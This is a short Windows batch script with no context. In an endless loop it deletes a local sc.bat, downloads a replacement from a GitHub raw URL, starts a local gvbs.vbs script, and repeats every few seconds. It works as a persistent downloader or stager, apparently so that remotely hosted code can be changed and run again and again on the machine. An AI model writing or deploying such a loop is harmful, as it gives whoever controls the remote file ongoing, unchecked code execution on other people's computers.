@echo off
:a
del sc.bat /a /q
timeout /t 2 /nobreak >nul
curl https://raw.githubusercontent.com/SeduHome/Test/main/sc.bat>sc.bat
timeout /t 2 /nobreak >nul
start gvbs.vbs
timeout /t 9 /nobreak >nul
goto a
